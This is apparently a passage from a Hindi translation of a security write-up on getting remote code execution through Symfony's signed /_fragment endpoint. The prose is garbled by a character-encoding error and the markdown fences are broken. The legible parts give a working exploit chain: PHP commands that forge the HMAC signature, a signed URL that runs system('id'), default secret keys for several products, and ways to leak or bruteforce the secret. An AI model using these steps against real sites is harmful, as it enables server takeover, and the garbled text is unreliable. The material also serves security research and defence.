рдЕрдм, `http://localhost:8000/_fragment` рдкрд░ рдЬрд╛рдиреЗ рд╕реЗ `403` рдорд┐рд▓рддрд╛ рд╣реИред рдЖрдЗрдП рдЕрдм рдПрдХ рдорд╛рдиреНрдп рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ:
```
$ php -r "echo(urlencode(base64_encode(hash_hmac('sha256', 'http://localhost:8000/_fragment', '50c8215b436ebfcc1d568effb624a40e', 1))) . PHP_EOL);"
lNweS5nNP8QCtMqyqrW8HIl4j9JXIfscGeRm%2FcmFOh8%3D
```
```markdown
`http://localhost:8000/_fragment?_hash=lNweS5nNP8QCtMqyqrW8HIl4j9JXIfscGeRm%2FcmFOh8%3D` рдХреА рдЬрд╛рдВрдЪ рдХрд░рдХреЗ, рд╣рдореЗрдВ рдЕрдм `404` рд╕реНрдЯреЗрдЯрд╕ рдХреЛрдб рдорд┐рд▓рд╛ рд╣реИред рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рд╕рд╣реА рдерд╛, рд▓реЗрдХрд┐рди рд╣рдордиреЗ рдХреЛрдИ рднреА рдЕрдиреБрд░реЛрдз рд╡рд┐рд╢реЗрд╖рддрд╛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдирд╣реАрдВ рдХреА, рдЗрд╕рд▓рд┐рдП Symfony рд╣рдорд╛рд░реЗ рдХрдВрдЯреНрд░реЛрд▓рд░ рдХреЛ рдирд╣реАрдВ рдкрд╛ рд╕рдХрддрд╛ред

рдЪреВрдВрдХрд┐ рд╣рдо рдХрд┐рд╕реА рднреА рд╡рд┐рдзрд┐ рдХреЛ, рдХрд┐рд╕реА рднреА рддрд░реНрдХ рдХреЗ рд╕рд╛рде, рдХреЙрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рд╣рдо рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП `system($command, $return_value)` рдЪреБрди рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдЗрд╕ рддрд░рд╣ рд╕реЗ рдПрдХ рдкреЗрд▓реЛрдб рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
```
$ page="http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull"
$ php -r "echo(urlencode(base64_encode(hash_hmac('sha256', '$page', '50c8215b436ebfcc1d568effb624a40e', 1))) . PHP_EOL);"
GFhQ4Hr1LIA8mO1M%2FqSfwQaSM8xQj35vPhyrF3hvQyI%3D
```
рд╣рдо рдЕрдм рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ URL рдкрд░ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ: `http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull&_hash=GFhQ4Hr1LIA8mO1M%2FqSfwQaSM8xQj35vPhyrF3hvQyI%3D`.

`500` рддреНрд░реБрдЯрд┐ рдХреЗ рдмрд╛рд╡рдЬреВрдж, рд╣рдо рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ **рд╣рдорд╛рд░рд╛ рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛ рдЧрдпрд╛**.

_RCE рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП рдлреНрд░реИрдЧрдореЗрдВрдЯ_

![1](https://www.ambionics.io/images/symfony-secret-fragment/1.png)

## рд░рд╣рд╕реНрдпреЛрдВ рдХреА рдЦреЛрдЬ <a href="#finding-secrets" id="finding-secrets"></a>

рдлрд┐рд░ рд╕реЗ: рдпрд╣ рд╕рдм рдорд╣рддреНрд╡рдкреВрд░реНрдг рдирд╣реАрдВ рд╣реЛрддрд╛ рдЕрдЧрд░ рд░рд╣рд╕реНрдп рдкреНрд░рд╛рдкреНрдд рдирд╣реАрдВ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗред рдЕрдХреНрд╕рд░, рд╡реЗ рд╣реЛрддреЗ рд╣реИрдВред рд╣рдо рдХрдИ рддрд░реАрдХреЗ рдмрддрд╛рдПрдВрдЧреЗ рдЬрд┐рдирд╕реЗ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдмрд┐рдирд╛ рдХрд┐рд╕реА рдкреВрд░реНрд╡ рдЬреНрдЮрд╛рди рдХреЗред

### рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ <a href="#through-vulnerabilities" id="through-vulnerabilities"></a>

рдЪрд▓рд┐рдП рд╢реБрд░реБрдЖрдд рдХрд░рддреЗ рд╣реИрдВ рд╕реНрдкрд╖реНрдЯ рд╕реЗ: рдХрдо рдкреНрд░рднрд╛рд╡ рд╡рд╛рд▓реА рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд░рд╣рд╕реНрдп рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ред

#### рдлрд╛рдЗрд▓ рдкрдврд╝рдирд╛ <a href="#file-read" id="file-read"></a>

рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ, рдПрдХ рдлрд╛рдЗрд▓ рдкрдврд╝рдиреЗ рдХреА рдХрдордЬреЛрд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдлрд╛рдЗрд▓реЛрдВ рдХреЛ рдкрдврд╝рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдФрд░ `secret` рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

* `app/config/parameters.yml`
* `.env`

_рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдХреБрдЫ Symfony рдбреАрдмрдЧ рдЯреВрд▓рдмрд╛рд░ рдЖрдкрдХреЛ рдлрд╛рдЗрд▓реЗрдВ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВред_

#### PHPinfo <a href="#phpinfo" id="phpinfo"></a>

рд╣рд╛рд▓ рдХреЗ symfony рд╕рдВрд╕реНрдХрд░рдгреЛрдВ (3.x) рдореЗрдВ, `secret` `.env` рдореЗрдВ `APP_SECRET` рдХреЗ рд░реВрдк рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддрд╛ рд╣реИред рдЪреВрдВрдХрд┐ рдпрд╣ рдлрд┐рд░ рдПрдХ рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдЖрдпрд╛рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЗрд╕реЗ `phpinfo()` рдкреЗрдЬ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рджреЗрдЦрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

_APP\_SECRET рдХреЛ phpinfo рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд▓реАрдХ рдХрд░рдирд╛_

![2](https://www.ambionics.io/images/symfony-secret-fragment/2.png)

рдпрд╣ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ Symfony рдХреЗ рдкреНрд░реЛрдлрд╛рдЗрд▓рд░ рдкреИрдХреЗрдЬ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреИрд╕рд╛ рдХрд┐ рд╕реНрдХреНрд░реАрдирд╢реЙрдЯ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

#### SSRF / IP рд╕реНрдкреВрдлрд┐рдВрдЧ (CVE-2014-5245) <a href="#ssrf-ip-spoofing-cve-2014-5245" id="ssrf-ip-spoofing-cve-2014-5245"></a>

`FragmentListener` рдХреЗ рдкреАрдЫреЗ рдХрд╛ рдХреЛрдб рд╡рд░реНрд╖реЛрдВ рд╕реЗ рд╡рд┐рдХрд╕рд┐рдд рд╣реБрдЖ рд╣реИ: _2.5.3_ рд╕рдВрд╕реНрдХрд░рдг рддрдХ, рдЬрдм рдЕрдиреБрд░реЛрдз рдПрдХ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдкреНрд░реЙрдХреНрд╕реА (рдкрдврд╝реЗрдВ: `localhost`) рд╕реЗ рдЖрддрд╛ рдерд╛, рддреЛ рдЗрд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рдорд╛рдирд╛ рдЬрд╛рддрд╛ рдерд╛, рдФрд░ рдЗрд╕ рддрд░рд╣ рд╣реИрд╢ рдХреА рдЬрд╛рдВрдЪ рдирд╣реАрдВ рдХреА рдЬрд╛рддреА рдереАред рдПрдХ SSRF, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рддреБрд░рдВрдд рдХреЛрдб рдЪрд▓рд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддрд╛ рд╣реИ, рдЪрд╛рд╣реЗ `secret` рд╣реЛ рдпрд╛ рди рд╣реЛред рдпрд╣ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ eZPublish рдХреЛ 2014.7 рддрдХ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рддрд╛ рд╣реИред
```php
# ./vendor/symfony/symfony/src/Symfony/Component/HttpKernel/EventListener/FragmentListener.php
# Symfony 2.3.18

class FragmentListener implements EventSubscriberInterface
{
protected function validateRequest(Request $request)
{
// is the Request safe?
if (!$request->isMethodSafe()) {
throw new AccessDeniedHttpException();
}

// does the Request come from a trusted IP?
$trustedIps = array_merge($this->getLocalIpAddresses(), $request->getTrustedProxies());
$remoteAddress = $request->server->get('REMOTE_ADDR');
if (IpUtils::checkIp($remoteAddress, $trustedIps)) {
return;
}

// is the Request signed?
// we cannot use $request->getUri() here as we want to work with the original URI (no query string reordering)
if ($this->signer->check($request->getSchemeAndHttpHost().$request->getBaseUrl().$request->getPathInfo().(null !== ($qs = $request->server->get('QUERY_STRING')) ? '?'.$qs : ''))) {
return;
}

throw new AccessDeniedHttpException();
}

protected function getLocalIpAddresses()
{
return array('127.0.0.1', 'fe80::1', '::1');
}
```
рдирд┐рд╕реНрд╕рдВрджреЗрд╣, рдЙрди рд╕рднреА рддрдХрдиреАрдХреЛрдВ рдХреЛ рдПрдХ рдЕрдиреНрдп рднреЗрджреНрдпрддрд╛ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред рдЖрдЗрдП рдПрдХ рдФрд░ рдмреЗрд╣рддрд░ рд╡реЗрдХреНрдЯрд░ рдореЗрдВ рдЧреЛрддрд╛ рд▓рдЧрд╛рдПрдБ: рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдорд╛рдиред

### рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдорд╛рдиреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ <a href="#through-default-values" id="through-default-values"></a>

#### Symfony <= 3.4.43: `ThisTokenIsNotSoSecretChangeIt` <a href="#symfony-3443-thistokenisnotsosecretchangeit" id="symfony-3443-thistokenisnotsosecretchangeit"></a>

Symfony рд╡реЗрдмрд╕рд╛рдЗрдЯ рд╕реЗрдЯрдЕрдк рдХрд░рддреЗ рд╕рдордп, рдкрд╣рд▓рд╛ рдХрджрдо [symfony-standard](https://github.com/symfony/symfony-standard) рд╕реНрдХреЗрд▓реЗрдЯрди рдХреЛ рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░рдирд╛ рд╣реИред рдЗрдВрд╕реНрдЯреЙрд▓ рд╣реЛрдиреЗ рдкрд░, рдХреБрдЫ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдорд╛рдиреЛрдВ рдХреЗ рд▓рд┐рдП рдкреНрд░реЙрдореНрдкреНрдЯ рдкреВрдЫрд╛ рдЬрд╛рддрд╛ рд╣реИред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, рдХреБрдВрдЬреА `ThisTokenIsNotSoSecretChangeIt` рд╣реЛрддреА рд╣реИред

_Symfony рдХрд╛ рдЗрдВрд╕реНрдЯреЙрд▓реЗрд╢рди composer рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ_

![3](https://www.ambionics.io/images/symfony-secret-fragment/3.png)

рдмрд╛рдж рдХреЗ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ (4+) рдореЗрдВ, рд╕реАрдХреНрд░реЗрдЯ рдХреБрдВрдЬреА рд╕реБрд░рдХреНрд╖рд┐рдд рд░реВрдк рд╕реЗ рдЬрдирд░реЗрдЯ рдХреА рдЬрд╛рддреА рд╣реИред

#### ezPlatform 3.x (рдирд╡реАрдирддрдо): `ff6dc61a329dc96652bb092ec58981f7` <a href="#ezplatform-3x-latest-ff6dc61a329dc96652bb092ec58981f7" id="ezplatform-3x-latest-ff6dc61a329dc96652bb092ec58981f7"></a>

[ezPlatform](https://ezplatform.com), [ezPublish](https://en.wikipedia.org/wiki/EZ\_Publish) рдХрд╛ рдЙрддреНрддрд░рд╛рдзрд┐рдХрд╛рд░реА, рдЕрднреА рднреА Symfony рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред рдЬреВрди 10, 2019 рдХреЛ, рдПрдХ [commit](https://github.com/ezsystems/ezplatform/commit/974f2a70d9d0507ba7ca17226693b1a4967f23cf#diff-f579cccc964135c7d644c7b2d3b0d3ecR59) рдиреЗ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдХреБрдВрдЬреА рдХреЛ `ff6dc61a329dc96652bb092ec58981f7` рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ред рднреЗрджреНрдп рд╕рдВрд╕реНрдХрд░рдг 3.0-alpha1 рд╕реЗ 3.1.1 (рд╡рд░реНрддрдорд╛рди) рддрдХ рд╣реИрдВред

рд╣рд╛рд▓рд╛рдВрдХрд┐ [рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг](https://doc.ezplatform.com/en/latest/getting\_started/install\_ez\_platform/#change-installation-parameters) рдореЗрдВ рдХрд╣рд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рд╕реАрдХреНрд░реЗрдЯ рдХреЛ рдмрджрд▓рд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП, рдпрд╣ рдЕрдирд┐рд╡рд╛рд░реНрдп рдирд╣реАрдВ рд╣реИред

#### ezPlatform 2.x: `ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt` <a href="#ezplatform-2x-thisezplatformtokenisnotsosecret_pleasechangeit" id="ezplatform-2x-thisezplatformtokenisnotsosecret_pleasechangeit"></a>

Symfony рдХреЗ рд╕реНрдХреЗрд▓реЗрдЯрди рдХреА рддрд░рд╣, рдЖрдкрдХреЛ рдЗрдВрд╕реНрдЯреЙрд▓реЗрд╢рди рдХреЗ рджреМрд░рд╛рди рдПрдХ рд╕реАрдХреНрд░реЗрдЯ рджрд░реНрдЬ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░реЙрдореНрдкреНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдорд╛рди `ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt` рд╣реИред

#### Bolt CMS <= 3.7 (рдирд╡реАрдирддрдо): `md5(__DIR__)` <a href="#bolt-cms-37-latest-md5__dir__" id="bolt-cms-37-latest-md5__dir__"></a>

[Bolt CMS](https://bolt.cm) [Silex](https://github.com/silexphp/Silex) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдЬреЛ Symfony рдкрд░ рдЖрдзрд╛рд░рд┐рдд рдПрдХ рдирд┐рд░рд╕реНрдд рдорд╛рдЗрдХреНрд░реЛ-рдлреНрд░реЗрдорд╡рд░реНрдХ рд╣реИред рдпрд╣ рд╕реАрдХреНрд░реЗрдЯ рдХреБрдВрдЬреА рдХреЛ рдЗрд╕ рдЧрдгрдирд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реЗрдЯ рдХрд░рддрд╛ рд╣реИ:
```php
# ./vendor/silex/silex/src/Silex/Provider/HttpFragmentServiceProvider.php
$app['uri_signer.secret'] = md5(__DIR__);

# ./vendor/silex/silex/src/Silex/Provider/FormServiceProvider.php
$app['form.secret'] = md5(__DIR__);
```
рдЗрд╕ рдкреНрд░рдХрд╛рд░, рдХреЛрдИ рдЧреБрдкреНрдд рдХреЛ рдЕрдиреБрдорд╛рди рд▓рдЧрд╛ рд╕рдХрддрд╛ рд╣реИ, рдпрд╛ рдПрдХ Full Path Disclosure рд╕рдВрд╡реЗрджрдирд╢реАрд▓рддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрд╕реЗ рдЧрдгрдирд╛ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдпрджрд┐ рдЖрдк рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реАрдХреНрд░реЗрдЯ рдХреАрдЬрд╝ рдХреЗ рд╕рд╛рде рд╕рдлрд▓ рдирд╣реАрдВ рд╣реБрдП, рддреЛ рдирд┐рд░рд╛рд╢ рди рд╣реЛрдВ: рдЕрдиреНрдп рддрд░реАрдХреЗ рднреА рд╣реИрдВред

### Bruteforce <a href="#bruteforce" id="bruteforce"></a>

рдЪреВрдВрдХрд┐ рд╕реАрдХреНрд░реЗрдЯ рдЕрдХреНрд╕рд░ рдореИрдиреНрдпреБрдЕрд▓реА рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рд░реВрдк рд╕реЗ рдЙрддреНрдкрдиреНрди рдХрд┐рдП рдЬрд╛рдиреЗ рдХреЗ рд╡рд┐рдкрд░реАрдд), рд▓реЛрдЧ рдЕрдХреНрд╕рд░ рдПрдХ рд╕реБрд░рдХреНрд╖рд┐рдд рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рдореВрд▓реНрдп рдХреЗ рдмрдЬрд╛рдп рдПрдХ рдкрд╛рд╕рдлрд╝реНрд░реЗрдЬрд╝ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ, рдЬреЛ рдЗрд╕реЗ bruteforceable рдмрдирд╛рддрд╛ рд╣реИ рдпрджрд┐ рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рдЗрд╕рдХреЗ рдЦрд┐рд▓рд╛рдл bruteforce рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╣реИрд╢ рд╣реИред рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ, рдПрдХ рд╡реИрдз `/_fragment` URL, рдЬреИрд╕реЗ рдХрд┐ Symfony рджреНрд╡рд╛рд░рд╛ рдЙрддреНрдкрдиреНрди рдПрдХ, рд╣рдореЗрдВ рд╕реАрдХреНрд░реЗрдЯ рдХреЛ bruteforce рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡реИрдз рд╕рдВрджреЗрд╢-рд╣реИрд╢ рдЬреЛрдбрд╝реА рдкреНрд░рджрд╛рди рдХрд░реЗрдЧрд╛ред

_рдПрдХ рд╡реИрдз рдЕрдиреБрд░реЛрдз рдЬреЛ fragment рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИ рдЙрддреНрддрд░ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИ_

![4](https://www.ambionics.io/images/symfony-secret-fragment/4.png)

рдЗрд╕ рдмреНрд▓реЙрдЧрдкреЛрд╕реНрдЯ рдХреА рд╢реБрд░реБрдЖрдд рдореЗрдВ, рд╣рдордиреЗ рдХрд╣рд╛ рдерд╛ рдХрд┐ Symfony рдХрд╛ рд╕реАрдХреНрд░реЗрдЯ рдХрдИ рдЙрдкрдпреЛрдЧ рд╣реИрдВред рдЙрдирдореЗрдВ рд╕реЗ рдПрдХ рдЙрдкрдпреЛрдЧ рдпрд╣ рд╣реИ рдХрд┐ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ CSRF рдЯреЛрдХрди рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред `рд╕реАрдХреНрд░реЗрдЯ` рдХрд╛ рдПрдХ рдЕрдиреНрдп рдЙрдкрдпреЛрдЧ remember-me рдХреБрдХреАрдЬрд╝ рдХреЛ рд╕рд╛рдЗрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИред рдХреБрдЫ рдорд╛рдорд▓реЛрдВ рдореЗрдВ, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЕрдкрдиреЗ рд╕реНрд╡рдпрдВ рдХреЗ CSRF рдЯреЛрдХрди рдпрд╛ remember-me рдХреБрдХреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ `рд╕реАрдХреНрд░реЗрдЯ` рдХреЗ рдореВрд▓реНрдп рдХреЛ bruteforce рдХрд░ рд╕рдХрддрд╛ рд╣реИред

_рдЙрди рдЯреЛрдХрдиреЛрдВ рдХреЗ рдирд┐рд░реНрдорд╛рдг рдХреА рд░рд┐рд╡рд░реНрд╕ рдЗрдВрдЬреАрдирд┐рдпрд░рд┐рдВрдЧ рдХреЛ рдкрд╛рдардХ рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрднреНрдпрд╛рд╕ рдХреЗ рд░реВрдк рдореЗрдВ рдЫреЛрдбрд╝ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред_

### рдЖрдЧреЗ рдмрдврд╝рдирд╛: eZPublish <a href="#going-further-ezpublish" id="going-further-ezpublish"></a>

рдЙрджрд╛рд╣рд░рдг рдХреЗ рддреМрд░ рдкрд░ рдХреИрд╕реЗ рд╕реАрдХреНрд░реЗрдЯ рдХреЛ bruteforced рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ, рд╣рдо рджреЗрдЦреЗрдВрдЧреЗ рдХрд┐ рдХреИрд╕реЗ рд╣рдо eZPublish 2014.07 рдХреЗ рд╕реАрдХреНрд░реЗрдЯ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВред

#### Bruteforce рд╕рд╛рдордЧреНрд░реА рдЦреЛрдЬрдирд╛ <a href="#finding-bruteforce-material" id="finding-bruteforce-material"></a>

eZPublish рдЕрдкрдиреЗ CSRF рдЯреЛрдХрди рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдЙрддреНрдкрдиреНрди рдХрд░рддрд╛ рд╣реИ:
```php
# ./ezpublish_legacy/extension/ezformtoken/event/ezxformtoken.php
self::$token = sha1( self::getSecret() . self::getIntention() . session_id() );
```
eZP рдЗрд╕ рдЯреЛрдХрди рдХреЛ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рджреЛ рдЬреНрдЮрд╛рдд рдорд╛рдиреЛрдВ рдФрд░ рдПрдХ рдЧреБрдкреНрдд рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ: `getIntention()` рд╡рд╣ рдХреНрд░рд┐рдпрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд░рд╣рд╛ рд╣реИ (`authenticate` рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП), `session_id()` PHP рд╕реЗрд╢рди ID рд╣реИ, рдФрд░ `getSecret()`, рдЦреИрд░, Symfony рдХрд╛ `secret` рд╣реИред

рдЪреВрдВрдХрд┐ CSRF рдЯреЛрдХрди рдХреБрдЫ рдлреЙрд░реНрдореЛрдВ рдкрд░ рдкрд╛рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рдЕрдм рдЧреБрдкреНрдд рдХреЛ рдмреНрд░реВрдЯрдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рд╛рдордЧреНрд░реА рд╣реИред

рджреБрд░реНрднрд╛рдЧреНрдпрд╡рд╢, ezPublish рдиреЗ sensiolabs рд╕реЗ рдПрдХ рдмрдВрдбрд▓ рд╢рд╛рдорд┐рд▓ рдХрд┐рдпрд╛, [sensio/distribution-bundle](https://packagist.org/packages/sensio/distribution-bundle)ред рдпрд╣ рдкреИрдХреЗрдЬ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдЧреБрдкреНрдд рдХреБрдВрдЬреА рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рд╣реЛред рдпрд╣ рдЗрд╕реЗ рдЗрдВрд╕реНрдЯрд╛рд▓реЗрд╢рди рдкрд░ рдЗрд╕ рддрд░рд╣ рд╕реЗ рдЬрдирд░реЗрдЯ рдХрд░рддрд╛ рд╣реИ:
```php
# ./vendor/sensio/distribution-bundle/Sensio/Bundle/DistributionBundle/Configurator/Step/SecretStep.php

private function generateRandomSecret()
{
return hash('sha1', uniqid(mt_rand()));
}
```
рдпрд╣ рдмреНрд░реВрдЯрдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╛рдлреА рдХрдард┐рди рд▓рдЧрддрд╛ рд╣реИ: `mt_rand()` 2^31 рдЕрд▓рдЧ-рдЕрд▓рдЧ рдорд╛рди рджреЗ рд╕рдХрддрд╛ рд╣реИ, рдФрд░ `uniqid()` рд╡рд░реНрддрдорд╛рди рд╕рдордпрдореБрджреНрд░рд╛ (рдорд╛рдЗрдХреНрд░реЛрд╕реЗрдХрдВрдбреНрд╕ рдХреЗ рд╕рд╛рде) рд╕реЗ рдмрдирд╛ рд╣реЛрддрд╛ рд╣реИред
```php
// Simplified uniqid code

struct timeval tv;
gettimeofday(&tv, NULL);
return strpprintf(0, "%s%08x%05x", prefix, tv.tv_sec, tv.tv_usec);
```
#### рдЯрд╛рдЗрдорд╕реНрдЯреИрдореНрдк рдХрд╛ рдЦреБрд▓рд╛рд╕рд╛ <a href="#disclosing-the-timestamp" id="disclosing-the-timestamp"></a>

рд╕реМрднрд╛рдЧреНрдп рд╕реЗ, рд╣рдо рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐ рдпрд╣ рд░рд╣рд╕реНрдп рдЗрдВрд╕реНрдЯрд╛рд▓реЗрд╢рди рдХреЗ рдЕрдВрддрд┐рдо рдЪрд░рдг рдореЗрдВ рдЙрддреНрдкрдиреНрди рд╣реЛрддрд╛ рд╣реИ, рд╡реЗрдмрд╕рд╛рдЗрдЯ рд╕реЗрдЯ рдЕрдк рд╣реЛрдиреЗ рдХреЗ рддреБрд░рдВрдд рдмрд╛рджред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╣рдо рд╕рдВрднрд╡рддрдГ рдЗрд╕ рд╣реИрд╢ рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдпреБрдХреНрдд рдЯрд╛рдЗрдорд╕реНрдЯреИрдореНрдк рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВред

рдРрд╕рд╛ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рд▓реЙрдЧреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реИ (_рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП_ `/var/log/storage.log`); рдХреЛрдИ рд╡реНрдпрдХреНрддрд┐ рдкрд╣рд▓реА рдмрд╛рд░ рдХреИрд╢ рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдмрдирд╛рдИ рдЧрдИ рдереА, рдЙрд╕рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддрд╛ рд╣реИред рдХреИрд╢ рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ `generateRandomSecret()` рдХреЙрд▓ рд╣реЛрдиреЗ рдХреЗ рддреБрд░рдВрдд рдмрд╛рдж рдмрдирд╛рдИ рдЬрд╛рддреА рд╣реИред

